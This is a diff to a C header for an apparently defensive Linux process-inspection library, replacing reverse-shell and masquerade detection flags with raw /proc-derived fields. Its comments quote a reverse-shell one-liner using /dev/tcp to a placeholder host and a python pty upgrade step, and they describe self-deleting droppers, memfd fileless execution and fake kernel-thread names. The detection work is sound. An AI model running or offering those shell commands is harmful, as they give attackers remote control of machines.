@@ -232,230 +232,26 @@ enum {
 	KOFA_PF_KERNEL  = 1u << 1,
 
 	/*
-	 * THE EXECUTABLE IS GONE FROM THE FILESYSTEM: readlink of
-	 * /proc/<pid>/exe ends in " (deleted)".
+	 * THE EXECUTABLE LINK ENDED IN " (deleted)".
 	 *
-	 * The classic Linux dropper writes a file, executes it, and unlinks it
-	 * immediately, so that by the time anything looks there is nothing on
-	 * disk to scan. It is also what an ordinary package upgrade leaves
-	 * behind for every process still running the old binary, which is why
-	 * this is a fact and not a finding.
+	 * A FACT READ OFF THE LINK, not a judgement about it. Every package
+	 * upgrade leaves every still-running process in this state, and a
+	 * desktop has dozens at any moment; a dropper that unlinked itself is
+	 * in it too. Which of the two this is, is a question for a rule - see
+	 * `exe_on_disk` for the other half of it.
 	 */
 	KOFA_PF_EXE_GONE = 1u << 2,
 
 	/*
-	 * THE EXECUTABLE IS A memfd, which is the Linux shape of fileless
-	 * execution.
+	 * THE EXECUTABLE LINK NAMED A memfd.
 	 *
-	 * memfd_create(2) gives an anonymous file that lives only in memory;
-	 * writing an ELF into it and calling fexecve(2) runs a program that was
-	 * never on any filesystem. There is no file for a file scanner to find
-	 * and no path for a rule to match - the only trace is that
-	 * /proc/<pid>/exe points at "/memfd:<name> (deleted)".
-	 *
-	 * Legitimate users exist and are rare enough to name: some language
-	 * runtimes, and systemd's own sealed-file handling. Rare enough to be
-	 * worth looking at every time; not rare enough to be a verdict.
+	 * Also read off the link: "/memfd:<name>". memfd_create(2) gives an
+	 * anonymous file that lives only in memory, so a program run from one
+	 * was never on any filesystem. Kept separate from EXE_GONE because a
+	 * memfd never had a file and the "(deleted)" the kernel appends to it
+	 * does not mean what it means anywhere else.
 	 */
-	KOFA_PF_EXE_MEMFD = 1u << 3,
-
-	/*
-	 * THE EXECUTABLE WAS UNLINKED AND NOTHING HAS TAKEN ITS PLACE.
-	 *
-	 * KOFA_PF_EXE_GONE on its own is ambiguous and mostly boring: every
-	 * package upgrade leaves every still-running process pointing at a
-	 * deleted inode, and a desktop has dozens at any moment. The thing
-	 * that separates the dropper from the upgrade is whether the PATH
-	 * still resolves - an upgrade replaces the file, so the name comes
-	 * back immediately; a program that unlinked itself leaves nothing
-	 * there at all.
-	 *
-	 * One access() on a path this walk has already read, so it costs a
-	 * stat per deleted-exe process and nothing for the rest.
-	 *
-	 * STILL NOT A VERDICT: a build directory cleaned while a test binary
-	 * is running looks exactly like this. It is the difference between
-	 * "dozens per desktop" and "worth reading the next line about".
-	 */
-	KOFA_PF_EXE_UNLINKED = 1u << 4,
-
-	/*
-	 * A USERLAND PROCESS WEARING A KERNEL THREAD'S NAME: comm is
-	 * "[something]" and PF_KTHREAD is not set.
-	 *
-	 * ps renders kernel threads in brackets, so a process that names
-	 * ITSELF "[kworker/0:2]" disappears into a list of forty real ones.
-	 * It is a standard trick and it costs an attacker one prctl call.
-	 *
-	 * IT IS DETECTABLE HERE BY CONSTRUCTION, and that is worth saying
-	 * because it is an accident of an earlier decision rather than a
-	 * feature anybody designed. This walk classifies kernel threads from
-	 * PF_KTHREAD in field 9 of /proc/<pid>/stat - the kernel's own bit -
-	 * and never from the name, because the name was never trustworthy for
-	 * anything. So the disagreement between what the process CALLS itself
-	 * and what the kernel SAYS it is falls out for free, and there is no
-	 * way to spell the name that avoids it.
-	 *
-	 * A real kernel thread never sets this: it has PF_KTHREAD, so the two
-	 * agree.
-	 *
-	 * IT ALSO REQUIRES AN EXECUTABLE ON DISK - an exe link that resolves to
-	 * an absolute path. A real kernel thread has no exe link at all, so
-	 * without this test a process whose readlink merely FAILED - refused,
-	 * or gone between the two reads - could reach here and be called a
-	 * masquerade on the strength of a name and a missing answer. Requiring
-	 * a path turns the flag into a statement about two things that were
-	 * both observed: it calls itself a kernel thread, and here is the file
-	 * it is actually running.
-	 *
-	 * The false positive left is a program that legitimately brackets its
-	 * own name, which exists but is rare enough to read.
-	 */
-	KOFA_PF_FAKE_KTHREAD = 1u << 5,
-
-	/*
-	 * ONE OF stdin, stdout OR stderr IS A SOCKET.
-	 *
-	 * THE WEAK FORM, kept because it is what makes the strong one below
-	 * worth computing, and reported because a caller may want the broad
-	 * set. On its own it is close to useless on a desktop: measured, EIGHT
-	 * processes carry it at rest here and every one is legitimate - VS
-	 * Code's language servers, its extension hosts, this tree's own agent.
-	 * Modern desktop IPC is sockets, and those children are spawned with
-	 * the socket already on their stdio.
-	 */
-	KOFA_PF_STDIO_SOCKET = 1u << 6,
-
-	/*
-	 * fd 0 AND fd 1 ARE THE SAME SOCKET - not two sockets, the same one,
-	 * compared by the inode the kernel names it with.
-	 *
-	 * THE COMMON CASE OF A REVERSE SHELL, AND ONLY THE COMMON CASE. Read
-	 * the two sections below before using it; both are measured and both
-	 * change what this flag may be built into.
-	 *
-	 * `bash -i >& /dev/tcp/host/port 0>&1` has one socket and dups it onto
-	 * both ends, because there IS only one connection. A program that was
-	 * merely spawned with socket stdio has a socketpair, and a socketpair
-	 * is two objects with two inodes - one per direction:
-	 *
-	 *     eight spawned children   stdin 14376315, stdout 14376317
-	 *                              stdin 14382089, stdout 14382091  ...
-	 *                              - always a distinct pair
-	 *     a controlled reverse     stdin 14899490, stdout 14899490
-	 *     shell
-	 *
-	 * Sweeping every readable process with no shell running returns ZERO,
-	 * and with one running returns exactly it.
-	 *
-	 *
-	 * IT IS ANCHORED TO fd 0 AND fd 1, AND GENERALISING IT BREAKS IT.
-	 *
-	 * The tempting widening is "any two descriptors share a socket", and
-	 * it is wrong on ordinary software. Measured on this desktop, with
-	 * nothing malicious running:
-	 *
-	 *     claude  fd 1 and fd 7 are one socket; fd 2 and fd 8 are another
-	 *     claude  same shape, twice more
-	 *     code    fd 10 and fd 30 are one socket
-	 *
-	 * Those are a program keeping a spare handle on its own stdout and
-	 * stderr, which is a normal thing to do and has nothing to say about
-	 * anybody. Four false positives arrive the moment the test stops being
-	 * about the two descriptors that MEAN something. Not fd 0 against fd 2
-	 * either: stdout and stderr sharing an object is how every `2>&1` in
-	 * every script on the machine looks.
-	 *
-	 *
-	 * WHAT IT DOES NOT COVER, so nobody reads a quiet sweep as an all-clear.
-	 *
-	 * A shell whose stdio was wired with dup2 onto separate descriptors; a
-	 * socat or ncat relay, where the shell's peer is a local pipe and the
-	 * socket belongs to the relay; anything upgraded to a pty afterwards -
-	 * see KOFA_PF_STDIO_SAME_TTY; a payload that re-execs and rearranges
-	 * its descriptors; a connection passed in over SCM_RIGHTS. This is one
-	 * shape, it is the shape most of them have, and a scan that finds
-	 * nothing has found that this shape is absent and nothing more.
-	 *
-	 *
-	 * AND IT IS NOT A VERDICT EVEN WHEN IT FIRES. An inetd-style service
-	 * handed one connected socket as its stdio has exactly this shape and
-	 * is doing its job; so does a container entry point wired that way. It
-	 * is a statement about two descriptors. The other half is
-	 * KOFA_PF_SHELL, and this library reports both and joins neither.
-	 */
-	KOFA_PF_STDIO_SAME_SOCKET = 1u << 7,
-
-	/*
-	 * stdin, stdout AND stderr ARE ALL THE SAME TERMINAL.
-	 *
-	 * The shape a reverse shell has AFTER it is upgraded to a pty - the
-	 * `python -c 'import pty; pty.spawn("/bin/bash")'` step - because the
-	 * upgrade replaces the raw socket with a pseudo-terminal and puts it
-	 * on all three.
-	 *
-	 * READ THE NEXT SENTENCE BEFORE MATCHING ON THIS. It is also exactly
-	 * what EVERY interactive shell in EVERY terminal window looks like,
-	 * because that is what a terminal is. Alone it selects every login
-	 * shell on the machine and nothing else - it is not a weak signal, it
-	 * is not a signal.
-	 *
-	 * It is carried because the fact is free once the three links are read
-	 * and because the thing that separates the two cases is not here: it is
-	 * WHO HOLDS THE OTHER END. A terminal emulator or sshd owns the master
-	 * side of a real login's pty; for an upgraded shell it is whatever the
-	 * attacker ran. That is a walk of other processes' descriptors, which
-	 * is a caller's job and not this flag's.
-	 */
-	KOFA_PF_STDIO_SAME_TTY = 1u << 8,
-
-	/*
-	 * THE EXECUTABLE IS A SHELL, by the name of the file being run.
-	 *
-	 * sh, bash, dash, zsh, ksh, ash, busybox, fish, csh, tcsh. A NAME and
-	 * therefore a claim, like every name: a payload copied to /tmp/bash is
-	 * not a shell and a shell copied to /tmp/nginx still is. It is here
-	 * rather than in each caller for the reason kof_classify_path is where
-	 * it is - four consumers matching this list privately is four chances
-	 * to disagree about which names are on it.
-	 *
-	 * On its own it is not interesting at all; a machine is full of shells.
-	 * It exists to be the second half of KOFA_PF_STDIO_SAME_SOCKET, and
-	 * the join is still the caller's.
-	 */
-	KOFA_PF_SHELL = 1u << 9,
-
-	/*
-	 * THE PROCESS HOLDS NOTHING BUT THAT ONE SOCKET: every descriptor in
-	 * its table points at the same object as fd 0.
-	 *
-	 * This is the "it has only its stdio" test, and it is written as a
-	 * PROPERTY rather than as a count because the count is wrong. The
-	 * obvious form is "exactly three descriptors", and measured against a
-	 * real shell it never fires:
-	 *
-	 *     bash -i >& /dev/tcp/...   fd 0, 1, 2 AND 255 -> socket:[14908548]
-	 *
-	 * fd 255 is bash's own copy of the terminal, kept for job control in
-	 * every interactive shell. dash and sh have three descriptors, bash
-	 * has four, and another shell may have five - so a number here encodes
-	 * which shell the rule was written against. "Every descriptor is the
-	 * same object" says what was actually meant and is true of all of them.
-	 *
-	 * WHAT IT SEPARATES. A program that is doing work holds a working set:
-	 * files, an epoll, pipes, a terminal, the listening socket it accepted
-	 * from. A shell handed a connection and nothing else holds exactly the
-	 * connection. That is also why this does NOT fire on netcat, ncat or
-	 * socat: a relay holds its listening socket and its accepted socket at
-	 * the very least, so its descriptors are not one object. Those tools
-	 * are a different shape and want a different rule - this one is for
-	 * the case where a SHELL was given the socket directly, which is the
-	 * common one.
-	 *
-	 * Combined with KOFA_PF_SHELL this is the whole finding, and the
-	 * combining is still the caller's.
-	 */
-	KOFA_PF_STDIO_ONLY = 1u << 10
+	KOFA_PF_EXE_MEMFD = 1u << 3
 };
 
 struct kofa_proc {
@@ -523,34 +319,63 @@ struct kofa_proc {
 	 * WHAT ITS FILE DESCRIPTORS ARE, counted rather than listed.
 	 *
 	 * `n_fd` is how many it has open; `n_socket` how many of those are
-	 * sockets. Both zero when the walk did not ask or was refused, which
-	 * is why KOFA_PF_STDIO_SOCKET is a separate flag: a count of zero and
-	 * a question nobody asked look the same, and the flag only ever
-	 * appears when the answer was actually obtained.
+	 * sockets; `n_like_stdin` how many point at the same object as fd 0.
 	 *
-	 * A COUNT AND NOT A LIST, because the list is unbounded - a busy
-	 * daemon holds thousands - and because the two facts a caller acts on
-	 * are "how many" and "is stdio a socket". Anything finer is a second
-	 * pass over /proc/<pid>/fd that the caller can make itself.
+	 * THE THIRD IS THE ONE A RULE CANNOT COMPUTE FOR ITSELF. A caller sees
+	 * three link strings below and could compare those, but it cannot see
+	 * fd 7 or fd 255 - and whether anything BEYOND stdio points at the same
+	 * object is exactly what separates a shell holding one connection from
+	 * a program holding a working set. Counting it costs nothing here,
+	 * because the descriptor walk is already running to produce n_fd.
 	 *
-	 * Needs kofa_plist_option.want_fds.
+	 * All zero when the walk did not ask or was refused. A count of zero
+	 * and a question nobody asked look the same, so a rule that cares
+	 * checks `fds_read`.
+	 *
+	 * Needs kofa_plist_option.no_fds unset.
 	 */
 	uint32_t n_fd;
 	uint32_t n_socket;
+	uint32_t n_like_stdin;
+
+	/* The descriptor walk ran and its answers are meaningful. */
+	uint8_t fds_read;
 
 	/*
-	 * WHAT stdin, stdout AND stderr ACTUALLY POINT AT, verbatim as the
-	 * kernel spells it: "socket:[14899490]", "/dev/pts/3", "pipe:[123]",
-	 * "/dev/null", or a path. Borrowed, "" when the link could not be
-	 * read.
+	 * THE EXECUTABLE PATH RESOLVES ON THE FILESYSTEM RIGHT NOW.
 	 *
-	 * The raw strings and not just the flags above, for the reason
-	 * kofa_region keeps `path` beside its classification: a flag is a
-	 * decision that can be wrong, and the text is the only thing that lets
-	 * anybody check it - or ask a question this library did not think of.
-	 * Comparing the two for equality is exactly how
-	 * KOFA_PF_STDIO_SAME_SOCKET is computed, and a caller wanting a
-	 * different comparison has the same material.
+	 * Only meaningful with KOFA_PF_EXE_GONE: together they say the file
+	 * was unlinked and nothing has taken its place, which is the shape of
+	 * a program that deleted itself rather than of a package upgrade. Two
+	 * facts, reported separately, because joining them is a rule's job.
+	 *
+	 * Costs one access() and only for a process whose link said
+	 * "(deleted)", so it is a handful per sweep.
+	 */
+	uint8_t exe_on_disk;
+
+	/*
+	 * THE KERNEL SAYS THIS IS A KERNEL THREAD: PF_KTHREAD, field 9 of
+	 * /proc/<pid>/stat.
+	 *
+	 * The kernel's own bit and never the name. That is what makes the
+	 * disagreement between the two observable at all - a process may call
+	 * itself "[kworker/0:2]" and this still says what it is - and it is
+	 * why this walk has never classified from the name.
+	 */
+	uint8_t is_kthread;
+
+	uint8_t _pad;
+
+	/*
+	 * WHAT stdin, stdout AND stderr POINT AT, verbatim as the kernel
+	 * spells it: "socket:[14899490]", "/dev/pts/3", "pipe:[123]",
+	 * "/dev/null", or a path. Borrowed, "" when the link could not be read.
+	 *
+	 * The raw strings, because a flag is a decision that can be wrong and
+	 * the text is the only thing that lets anybody check it - or ask a
+	 * question this library did not think of. Comparing two of them for
+	 * equality is how a rule asks whether one object is on both ends.
 	 */
 	const char *fd_stdin;
 	const char *fd_stdout;
